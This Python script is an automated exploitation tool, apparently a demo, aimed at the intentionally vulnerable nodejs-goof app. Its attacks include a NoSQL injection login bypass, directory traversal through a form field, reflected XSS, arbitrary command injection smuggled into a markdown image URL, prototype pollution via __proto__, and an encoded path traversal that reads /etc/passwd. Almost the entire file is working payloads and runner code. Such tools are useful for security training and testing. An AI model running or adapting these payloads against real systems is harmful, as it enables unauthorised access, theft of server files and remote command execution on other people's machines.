#!/usr/bin/env python3
"""
nodejs-goof Automated Exploitation Script
Red Hat Cybersecurity Engineering Demo
Kali Linux Penetration Testing Tool
"""

import requests
import json
import sys
import argparse

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    CYAN = '\033[0;36m'
    NC = '\033[0m'

class NodejsGoofExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.authenticated = False

    def banner(self):
        print(Colors.RED + """
╔══════════════════════════════════════════════════════╗
║  nodejs-goof Automated Exploitation Framework       ║
║  Red Hat Cybersecurity Engineering                  ║
╚══════════════════════════════════════════════════════╝
""" + Colors.NC)
        print(Colors.CYAN + f"Target: {self.target}\n" + Colors.NC)

    def nosql_injection(self):
        """Exploit NoSQL injection for authentication bypass"""
        print(Colors.YELLOW + "[*] Testing NoSQL injection authentication bypass..." + Colors.NC)

        payload = {
            "username": "admin@snyk.io",
            "password": {"$gt": ""}
        }

        try:
            response = self.session.post(
                f"{self.target}/login",
                json=payload,
                allow_redirects=False,
                timeout=10
            )

            if response.status_code == 302:
                print(Colors.GREEN + "[+] NoSQL injection successful!" + Colors.NC)
                print(Colors.GREEN + f"[+] Session cookie: {response.cookies.get('connect.sid')}" + Colors.NC)
                self.authenticated = True
                return True
            else:
                print(Colors.RED + f"[-] NoSQL injection failed (Status: {response.status_code})" + Colors.NC)
                return False
        except Exception as e:
            print(Colors.RED + f"[-] Error: {str(e)}" + Colors.NC)
            return False

    def directory_traversal(self, target_file="./../package.json"):
        """Exploit directory traversal to read files"""
        print(Colors.YELLOW + f"[*] Testing directory traversal to read: {target_file}..." + Colors.NC)

        if not self.authenticated:
            print(Colors.YELLOW + "[*] Authenticating first..." + Colors.NC)
            if not self.nosql_injection():
                return None

        payload = {
            "email": "admin@snyk.io",
            "firstname": "admin",
            "lastname": "admin",
            "country": "IL",
            "phone": "+972551234123",
            "layout": target_file
        }

        try:
            response = self.session.post(
                f"{self.target}/account_details",
                json=payload,
                timeout=10
            )

            if response.status_code == 200 and ("name" in response.text or "version" in response.text):
                print(Colors.GREEN + f"[+] Directory traversal successful!" + Colors.NC)
                print(Colors.CYAN + "[+] Extracted content:" + Colors.NC)
                print(response.text[:500])
                return response.text
            else:
                print(Colors.RED + f"[-] Directory traversal failed (Status: {response.status_code})" + Colors.NC)
                return None
        except Exception as e:
            print(Colors.RED + f"[-] Error: {str(e)}" + Colors.NC)
            return None

    def xss_injection(self, payload='"><script>alert(1)</script>'):
        """Test XSS vulnerability"""
        print(Colors.YELLOW + f"[*] Testing XSS injection..." + Colors.NC)

        try:
            response = self.session.get(
                f"{self.target}/login",
                params={"redirectPage": payload},
                timeout=10
            )

            if payload in response.text:
                print(Colors.GREEN + "[+] XSS vulnerability confirmed!" + Colors.NC)
                print(Colors.GREEN + f"[+] Payload reflected: {payload[:50]}..." + Colors.NC)
                return True
            else:
                print(Colors.RED + "[-] XSS injection failed" + Colors.NC)
                return False
        except Exception as e:
            print(Colors.RED + f"[-] Error: {str(e)}" + Colors.NC)
            return False

    def command_injection(self, cmd="touch /tmp/pwned"):
        """Test command injection via image processing"""
        print(Colors.YELLOW + f"[*] Testing command injection: {cmd}..." + Colors.NC)

        payload = f'![alt text](https://example.com/img.png;{cmd} "Image")'

        try:
            response = self.session.post(
                f"{self.target}/create",
                data={"content": payload},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=10
            )

            if response.status_code in [200, 302]:
                print(Colors.GREEN + "[+] Command injection payload delivered!" + Colors.NC)
                print(Colors.YELLOW + "[*] Check server for command execution (e.g., ls -la /tmp/pwned)" + Colors.NC)
                return True
            else:
                print(Colors.RED + f"[-] Command injection failed (Status: {response.status_code})" + Colors.NC)
                return False
        except Exception as e:
            print(Colors.RED + f"[-] Error: {str(e)}" + Colors.NC)
            return False

    def prototype_pollution(self):
        """Test prototype pollution vulnerability"""
        print(Colors.YELLOW + "[*] Testing prototype pollution..." + Colors.NC)

        # Step 1: Send normal message
        payload1 = {
            "auth": {"name": "user", "password": "pwd"},
            "message": {"text": "Hello"}
        }

        try:
            response1 = self.session.put(
                f"{self.target}/chat",
                json=payload1,
                timeout=10
            )

            if response1.status_code != 200:
                print(Colors.RED + f"[-] Failed to send normal message" + Colors.NC)
                return False

            # Step 2: Pollute prototype
            payload2 = {
                "auth": {"name": "user", "password": "pwd"},
                "message": {
                    "text": "😈",
                    "__proto__": {"canDelete": True}
                }
            }

            response2 = self.session.put(
                f"{self.target}/chat",
                json=payload2,
                timeout=10
            )

            if response2.status_code == 200:
                print(Colors.GREEN + "[+] Prototype pollution successful!" + Colors.NC)
                print(Colors.GREEN + "[+] Object.prototype polluted with canDelete=true" + Colors.NC)
                return True
            else:
                print(Colors.RED + f"[-] Prototype pollution failed" + Colors.NC)
                return False

        except Exception as e:
            print(Colors.RED + f"[-] Error: {str(e)}" + Colors.NC)
            return False

    def info_disclosure(self):
        """Test ST directory traversal for /etc/passwd"""
        print(Colors.YELLOW + "[*] Testing ST directory traversal (read /etc/passwd)..." + Colors.NC)

        try:
            response = self.session.get(
                f"{self.target}/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                timeout=10
            )

            if response.status_code == 200 and "root:" in response.text:
                print(Colors.GREEN + "[+] Information disclosure successful!" + Colors.NC)
                print(Colors.CYAN + "[+] /etc/passwd content:" + Colors.NC)
                print(response.text[:300])
                return True
            else:
                print(Colors.RED + f"[-] Information disclosure failed (Status: {response.status_code})" + Colors.NC)
                return False
        except Exception as e:
            print(Colors.RED + f"[-] Error: {str(e)}" + Colors.NC)
            return False

    def run_all_exploits(self):
        """Run all available exploits"""
        self.banner()
        print(Colors.CYAN + "[*] Running all exploits...\n" + Colors.NC)

        results = {
            "NoSQL Injection": self.nosql_injection(),
            "Directory Traversal": self.directory_traversal(),
            "XSS Injection": self.xss_injection(),
            "Command Injection": self.command_injection(),
            "Prototype Pollution": self.prototype_pollution(),
            "Information Disclosure": self.info_disclosure()
        }

        print(Colors.CYAN + "\n" + "="*60 + Colors.NC)
        print(Colors.CYAN + "EXPLOITATION SUMMARY" + Colors.NC)
        print(Colors.CYAN + "="*60 + Colors.NC)

        for exploit, success in results.items():
            status = Colors.GREEN + "[SUCCESS]" + Colors.NC if success else Colors.RED + "[FAILED]" + Colors.NC
            print(f"{status} {exploit}")

        successful = sum(1 for v in results.values() if v)
        total = len(results)
        print(Colors.CYAN + f"\nTotal: {successful}/{total} exploits successful" + Colors.NC)


def main():
    parser = argparse.ArgumentParser(
        description="nodejs-goof Automated Exploitation Framework",
        epilog="Red Hat Cybersecurity Engineering Demo"
    )

    parser.add_argument(
        "-t", "--target",
        default="http://localhost:3001",
        help="Target URL (default: http://localhost:3001)"
    )

    parser.add_argument(
        "-e", "--exploit",
        choices=["nosql", "traversal", "xss", "cmdinj", "proto", "info", "all"],
        default="all",
        help="Exploit to run (default: all)"
    )

    parser.add_argument(
        "-f", "--file",
        help="Target file for directory traversal (default: ./../package.json)"
    )

    parser.add_argument(
        "-c", "--command",
        help="Command for command injection (default: touch /tmp/pwned)"
    )

    args = parser.parse_args()

    exploit = NodejsGoofExploit(args.target)

    if args.exploit == "all":
        exploit.run_all_exploits()
    elif args.exploit == "nosql":
        exploit.banner()
        exploit.nosql_injection()
    elif args.exploit == "traversal":
        exploit.banner()
        target_file = args.file if args.file else "./../package.json"
        exploit.directory_traversal(target_file)
    elif args.exploit == "xss":
        exploit.banner()
        exploit.xss_injection()
    elif args.exploit == "cmdinj":
        exploit.banner()
        cmd = args.command if args.command else "touch /tmp/pwned"
        exploit.command_injection(cmd)
    elif args.exploit == "proto":
        exploit.banner()
        exploit.prototype_pollution()
    elif args.exploit == "info":
        exploit.banner()
        exploit.info_disclosure()


if __name__ == "__main__":
    main()
